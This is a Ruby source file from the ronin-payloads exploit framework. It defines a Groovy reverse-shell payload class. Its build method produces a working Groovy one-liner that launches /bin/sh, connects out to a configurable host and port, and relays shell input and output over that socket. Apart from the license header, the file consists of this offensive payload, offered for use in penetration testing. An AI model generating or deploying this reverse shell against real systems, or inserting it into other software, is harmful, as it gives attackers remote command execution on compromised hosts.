# frozen_string_literal: true
#
# ronin-payloads - A Ruby micro-framework for writing and running exploit
# payloads.
#
# Copyright (c) 2007-2023 Hal Brodigan (postmodern.mod3 at gmail.com)
#
# ronin-payloads is free software: you can redistribute it and/or modify
# it under the terms of the GNU Lesser General Public License as published
# by the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# ronin-payloads is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public License
# along with ronin-payloads.  If not, see <https://www.gnu.org/licenses/>.
#

require 'ronin/payloads/groovy_payload'
require 'ronin/payloads/mixins/reverse_shell'

module Ronin
  module Payloads
    module Groovy
      #
      # A basic Groovy reverse shell.
      #
      # @since 0.2.0
      #
      class ReverseShell < GroovyPayload

        include Mixins::ReverseShell

        register 'groovy/reverse_shell'

        summary 'A basic Groovy reverse shell'
        description <<~DESC
          A basic Groovy reverse shell command.
        DESC

        #
        # Builds the Groovy reverse shell command.
        #
        def build
          @payload = %{Process p=new ProcessBuilder("/bin/sh").redirectErrorStream(true).start();Socket s=new Socket(#{host.inspect},#{port});InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();}
        end

      end
    end
  end
end
